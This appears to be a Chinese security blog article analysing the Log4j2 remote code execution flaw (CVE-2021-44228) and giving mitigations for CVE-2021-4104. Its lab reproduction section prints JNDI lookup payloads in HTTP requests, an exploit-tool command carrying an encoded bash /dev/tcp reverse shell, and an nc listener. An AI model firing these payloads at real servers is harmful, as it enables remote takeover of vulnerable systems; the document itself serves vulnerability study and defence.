# 前言

本文主要对12月9日Log4j2远程命令执行漏洞（CVE-2021-44228）的造成原理以及利用方式进行分析和介绍，还对apache官方在12月14日发布的CVE-2021-4104（影响Log4j
1.2版本）漏洞进行介绍并提出处置建议。

![1639712289_61bc0621a20fdd68aef77.png!small?1639712291161](https://image.3001.net/images/20211217/1639712289_61bc0621a20fdd68aef77.png!small?1639712291161)

图 1 Apache工程师对CVE-2021-4104的描述

12 月 9 日是一个值得纪念的日子……令所有安全从业人员多掉几根头发的日子，Log4j2 RCE
POC的公开，直接导致了一波安全从业人员的疯狂运动，由于受该漏洞影响的服务几乎无处不在，各个应急响应单位一夜之间纷纷停接该漏洞的提交申请。由于Log4j2
RCE的影响巨大，甚至有人称之为新一代的“永恒之蓝”。

![1639712307_61bc0633b8859ca8d4a18.png!small?1639712308218](https://image.3001.net/images/20211217/1639712307_61bc0633b8859ca8d4a18.png!small?1639712308218)

图 2 朋友圈惊叹Log4j2漏洞无处不在

![1639712325_61bc0645bb2bff9a042c1.png!small?1639712326885](https://image.3001.net/images/20211217/1639712325_61bc0645bb2bff9a042c1.png!small?1639712326885)

图 3 堪称最安全的苹果系统也无法逃避

# 漏洞是怎么导致的？

下面是触发漏洞的两部分关键代码：

1.org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format()
方法（表达式内容替换）：

这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${
就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。

在 ${ 中可以使用的关键词如下：

![1639712382_61bc067eaee08359d0c41.png!small?1639712383466](https://image.3001.net/images/20211217/1639712382_61bc067eaee08359d0c41.png!small?1639712383466)

图 4 ${可替换的内容

2.apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）

日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为
key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。

由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker
查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:

${jndi:ldap://ip/port/exp}

最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图所示：

![1639712440_61bc06b85a207de73fde2.png!small?1639712441101](https://image.3001.net/images/20211217/1639712440_61bc06b85a207de73fde2.png!small?1639712441101)

图 5 利用流程图

整个利用流程分两步：

第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap
服务收到请求之后，将请求进行重定向到恶意 java class 的地址。

第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。

关于利用LDAP服务来进行注入攻击已经不是第一次了，JNDI注入，即某代码中存在JDNI的string可控的情况，可构造恶意RMI或者LDAP服务端，导致远程任意类被加载，造成任意代码执行。Fastjson
RCE漏洞的利用也用到LDAP注入攻击，还有其他的一些。

![1639712463_61bc06cf985900ad0692b.png!small?1639712464093](https://image.3001.net/images/20211217/1639712463_61bc06cf985900ad0692b.png!small?1639712464093)

图 6 JNDI注入中RMI和LDAP与JDK版本的关系

# 漏洞验证+复现

### 环境准备

 **网络环境：**

  * 存在漏洞的环境资产IP：x.x.190:49153

（可以通过使用docker来下载漏洞镜像：

docker pull vulfocus/log4j2-rce-2021-12-09:latest）

  * 攻击主机IP（2台）：x.x.172（放置攻击负载），x.x.x.89(远控机)

 **需要的工具：**

  * Burpsuit
  * JNDI-Injection-Exploit（或者是JNDIExploit-1.2-SNAPSHOT等其他JNDI注入工具都可以）

工具链接：

 _https://github.com/welk1n/JNDI-Injection-Exploit_

<https://github.com/Mr-xn/JNDIExploit-1>

### 一、黑盒验证方法

已经知道存在漏洞是因为在打日志的时候存在问题，所以对于黑盒测试而言，只要是能够被服务端获取且被记录的地方都是可以触发漏洞的，比如 header 中的
Cookie、User-agent 等，post或者get的参数中，url中等，这种只能盲打，根据返回结果来判断。

所以检测时主要在header和数据部分中增加 payload 进行漏洞触发，可以使用dnslog平台相关域名访问进行漏洞检测。

 _部分公共dnslog平台如下：_

 _ceye.io_
_、dnslog.link、dnslog.cn、dnslog.io、tu4.org、burpcollaborator.net、s0x.cn_

这边我使用了ceye.io来进行验证。

Request data:

POST /xxx HTTP/1.1

Host: (漏洞IP):49153

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101
Firefox/47.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

DNT: 1

X-Forwarded-For: 1.1.1.1

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 37

  

payload=${jndi:ldap://xxxxxx.ceye.io}

![1639712512_61bc0700ac5906ea76a81.png!small?1639712513244](https://image.3001.net/images/20211217/1639712512_61bc0700ac5906ea76a81.png!small?1639712513244)

图 7 dnslog验证请求

从平台上可以看到dns的解析记录，说明存在漏洞。

![1639712528_61bc071008722918a4ff1.png!small?1639712528262](https://image.3001.net/images/20211217/1639712528_61bc071008722918a4ff1.png!small?1639712528262)

图 8 dnslog记录

![1639712549_61bc07257f6089c39e961.png!small?1639712549886](https://image.3001.net/images/20211217/1639712549_61bc07257f6089c39e961.png!small?1639712549886)

图 9 IP验证

### 二、反弹shell

网络通信主要流程如下图所示。

![1639712571_61bc073b809f7f918d9e8.png!small?1639712572238](https://image.3001.net/images/20211217/1639712571_61bc073b809f7f918d9e8.png!small?1639712572238)

图 10 通信流程

在172服务器上使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar启动一个ldap服务
，如果出现报错，可以下载源码，重新编译。

可以更改端口后编译，在/src/main/java/run/ServerStart.java 的26-28行位置进行修改。

![1639712596_61bc0754b473ba99c6cbb.png!small?1639712597184](https://image.3001.net/images/20211217/1639712596_61bc0754b473ba99c6cbb.png!small?1639712597184)

对工具进行编译

mvn clean package -DskipTests

编译完成后，开启jndi服务。

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c
{echo,（反弹shell base64 编码）}|{base64,-d}|{bash,-i}" -A "（放置攻击负载的IP）"

反弹shell base64 编码内容为

bash -i >& /dev/tcp/ip/port 0>&1

启动服务

![1639712618_61bc076ac2fd8a4c0ab3a.png!small?1639712619532](https://image.3001.net/images/20211217/1639712618_61bc076ac2fd8a4c0ab3a.png!small?1639712619532)

图 11 启动jndi服务

在89服务器上开启监听

nc -lvnp 9999

![1639712631_61bc0777602d39fd37415.png!small?1639712631775](https://image.3001.net/images/20211217/1639712631_61bc0777602d39fd37415.png!small?1639712631775)

图 12 监听端口

172主机发送请求

Request data:

POST /xxx HTTP/1.1

Host: (漏洞ip):49153

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101
Firefox/47.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

DNT: 1

X-Forwarded-For: 1.1.1.1

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 50

  

payload=${jndi:rmi://x.x.x.172:11099/ow5ppx}

![1639712652_61bc078c00f014db997d8.png!small?1639712652563](https://image.3001.net/images/20211217/1639712652_61bc078c00f014db997d8.png!small?1639712652563)

图 13 请求攻击负载

172的JNDI服务收到190的请求。

![1639712668_61bc079cd90263dae4ae8.png!small?1639712671681](https://image.3001.net/images/20211217/1639712668_61bc079cd90263dae4ae8.png!small?1639712671681)

图 14 jndi服务收到请求

89服务器监听到shell命令，说明反弹shell成功。

# CVE-2021-4104应急处置

###  **一、漏洞描述：**

当攻击者具有对Log4j配置的写访问权限时，Log4j
1.2中的JMSAppender容易受到不受信任数据反序列化的攻击。攻击者可以提供TopicBindingName和TopicConnectionFactoryBindingName配置，导致JMSApender执行JNDI请求，从而以与CVE-2021-44228类似的方式执行远程代码。

注意：当 **专门配置使用JMSApender时** ，此问题仅影响Log4j 1.2，这不是默认设置。Apache Log4j
1.2于2015年8月终止使用。用户应该升级到Log4j 2，因为它解决了以前版本中的许多其他问题。

###  **二、处置方法：**

升级Log4j到最新版本

若暂时无法进行升级操作，可先用下列措施进行临时缓解：

1、添加jvm参数启动：-Dlog4j2.formatMsgNoLookups=true

![1639712753_61bc07f11fa32cf34b640.png!small?1639712753396](https://image.3001.net/images/20211217/1639712753_61bc07f11fa32cf34b640.png!small?1639712753396)

图 15 添加jvm参数启动

2、在应用的classpath下添加log4j2.component.properties配置文件，文件内容为：log4j2.formatMsgNoLookups=true

![1639712775_61bc0807004d3a2cfa9d2.png!small?1639712775411](https://image.3001.net/images/20211217/1639712775_61bc0807004d3a2cfa9d2.png!small?1639712775411)

图 16 添加配置

3、设置系统环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS=true

4、使用下列命令，移除log4j-core包中的JndiLookup 类文件：

zip -q -d log4j-core-*.jar
org/apache/logging/log4j/core/lookup/JndiLookup.class

 ** _注：当且仅当Apache Log4j >= 2.10版本时，可使用1、2、3、4的任一措施进行防护。_**

5、采用人工方式禁用JNDI，例：在spring.properties里添加spring.jndi.ignore=true

6、建议使用JDK在11.0.1、8u191、7u201、6u211及以上的高版本，可在一定程度防止RCE。

7、限制受影响应用对外访问互联网，并在边界对dnslog相关域名访问进行检测。

  

##  **参考文章：**

[https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html（lookups）](https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html%EF%BC%88lookups%EF%BC%89)

[https://blog.csdn.net/weixin_42345596/article/details/119421070（Fastjson远程命令执行漏洞总结）](https://blog.csdn.net/weixin_42345596/article/details/119421070%EF%BC%88Fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%EF%BC%89)

https://blog.csdn.net/caiqiiqi/article/details/105951247（《JDK
8u191之后的JNDI注入(LDAP)》学习）

[https://security.tencent.com/index.php/blog/msg/131（深入理解JNDI注入与Java反序列化漏洞利用）](https://security.tencent.com/index.php/blog/msg/131%EF%BC%88%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JNDI%E6%B3%A8%E5%85%A5%E4%B8%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%89)

https://blog.csdn.net/whatday/article/details/107098353（java
Runtime.getRuntime().exec 获取反弹shell）

